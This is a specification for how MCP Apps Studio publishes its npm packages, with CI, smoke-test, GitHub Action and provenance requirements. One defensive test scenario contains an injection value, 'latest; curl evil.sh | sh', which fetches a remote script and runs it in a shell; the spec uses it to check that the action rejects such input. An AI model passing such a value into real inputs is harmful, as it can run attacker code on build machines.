# distribution Specification

## Purpose
Defines what MCP Apps Studio publishes to npm and how a release is proven installable, so the tool can be used outside this monorepo with `npx`.

## Requirements

### Requirement: Published packages
The repository SHALL publish exactly `mcp-apps-studio` (CLI) and `@mcp-apps-studio/widget-runtime`. The runtime dependency fields of their published manifests (`dependencies`, `peerDependencies`, `optionalDependencies`) MUST NOT reference `workspace:` versions or unpublished `@studio/*` packages, and SHALL point `exports`/`bin`/`types` at built JavaScript and declarations. Each published package SHALL contain a `README.md` and a `LICENSE` identical to the repository's `LICENSE`, and its manifest SHALL declare `repository`, `homepage` and `bugs` on `github.com/yanic0de/mcp-apps-studio`, an `author`, and `engines.node` `>=22`.

#### Scenario: Packed manifest
- **WHEN** the CLI package is packed
- **THEN** its `package.json` has `bin.mcp-apps-studio` pointing into `dist` and no dependency on a `@studio/*` package

#### Scenario: Package metadata
- **WHEN** the unit tests read both published `package.json` files
- **THEN** each has the repository, homepage, bugs, author and `engines.node >=22`, and its `LICENSE` equals the root `LICENSE`

### Requirement: Installable from tarballs
A pack smoke test SHALL install the packed tarballs into an empty project containing one widget HTML file, run `mcp-apps-studio init <widget>` and then `mcp-apps-studio test`, and succeed only if both exit `0` and `report.json` lists the scaffolded scenarios. It SHALL also fail when a tarball lacks `README.md` or `LICENSE`, when the installed `mcp-apps-studio --version` does not print a version, or when a mistyped command does not exit `1` with the "neither a command nor a directory" error.

#### Scenario: Fresh project
- **WHEN** the smoke test runs on a clean machine with Chromium installed
- **THEN** the generated story's non-live scenarios pass for both themes

#### Scenario: Tarball without a readme
- **WHEN** a packed tarball has no `package/README.md`
- **THEN** the smoke test fails naming the tarball

### Requirement: Continuous integration
CI SHALL run lint, typecheck and unit tests on Linux, macOS and Windows, and e2e plus the pack smoke test on Linux, for every push and pull request. Releases SHALL go through changesets, with changelog entries linking the pull request and author, and the release workflow SHALL run lint, typecheck, unit tests and the pack smoke test before any publish step. Every workflow and `action.yml` SHALL reference third-party actions by full commit SHA (the version tag in a trailing comment), and a workflow without a `permissions:` block MUST NOT exist; CI runs with `contents: read`.

#### Scenario: Pull request
- **WHEN** a pull request is opened
- **THEN** all CI jobs run and a failure blocks the check

#### Scenario: Unpinned action
- **WHEN** a workflow or `action.yml` contains `uses: actions/checkout@v4`
- **THEN** the unit tests fail naming the file and the reference

#### Scenario: Missing permissions
- **WHEN** a workflow file has no top-level `permissions:`
- **THEN** the unit tests fail naming the file

#### Scenario: Release without checks
- **WHEN** the unit tests inspect `release.yml`
- **THEN** `pnpm lint`, `pnpm typecheck`, `pnpm test` and `pnpm smoke:pack` run in steps before the changesets publish step

### Requirement: Current SDK generation
The published packages SHALL target the current major of `@modelcontextprotocol/ext-apps` (2.x) and the MCP SDK v2 packages: `@mcp-apps-studio/widget-runtime` SHALL declare `@modelcontextprotocol/ext-apps` `^2` and `@modelcontextprotocol/client` `^2` as peers, and the repository MUST NOT depend on `@modelcontextprotocol/sdk`.

#### Scenario: Installing with the SDK's own instructions
- **WHEN** a project installs `@modelcontextprotocol/ext-apps @modelcontextprotocol/client zod` (latest) and `@mcp-apps-studio/widget-runtime`
- **THEN** npm reports no unmet peer dependency for widget-runtime

### Requirement: GitHub Action
The repository SHALL provide a composite GitHub Action (`action.yml`) with inputs `directory` (default `.`), `version` (default `latest`) and `args` (extra `test` flags) that installs the Chromium build matching the CLI's Playwright (`mcp-apps-studio install-browser`), runs `mcp-apps-studio test` in `directory`, uploads the output directory as an artifact even on failure, and fails the step when the test fails. Inputs MUST reach shell steps only through environment variables, never through `${{ }}` interpolation inside `run:`, and a `version` that is not a semver range or an npm dist-tag (letters, digits, `.`, `-`, `^`, `~`) SHALL fail the step before anything is installed. After a release publishes, the release workflow SHALL move the `v<major>` tag of the CLI version (e.g. `v0`) to the released commit, and the documentation SHALL reference the action by that tag.

#### Scenario: Using the action
- **WHEN** a workflow uses the action with `directory: widgets`
- **THEN** the job runs every story headlessly, attaches the report and screenshots, and is red on any failed run

#### Scenario: No interpolation in shell
- **WHEN** the unit tests inspect `action.yml`
- **THEN** no `run:` script contains `${{`

#### Scenario: Hostile version input
- **WHEN** the action runs with `version: 'latest; curl evil.sh | sh'`
- **THEN** the step fails with an invalid-version message and nothing is executed from the input

#### Scenario: Major tag after a release
- **WHEN** the unit tests inspect `release.yml`
- **THEN** a step that runs only when the changesets step published moves and pushes the `v<major>` tag

### Requirement: Trusted publishing with provenance
Both published manifests SHALL set `publishConfig.provenance` to `true`. The release workflow SHALL publish through npm Trusted Publishing: its job has `id-token: write`, and no step receives an `NPM_TOKEN` or `NODE_AUTH_TOKEN`.

#### Scenario: Release workflow without a token
- **WHEN** the unit tests inspect `release.yml`
- **THEN** no step's `env` contains `NPM_TOKEN` or `NODE_AUTH_TOKEN` and the workflow permissions include `id-token: write`

#### Scenario: Provenance requested
- **WHEN** the unit tests read both published `package.json` files
- **THEN** each has `publishConfig.provenance === true`
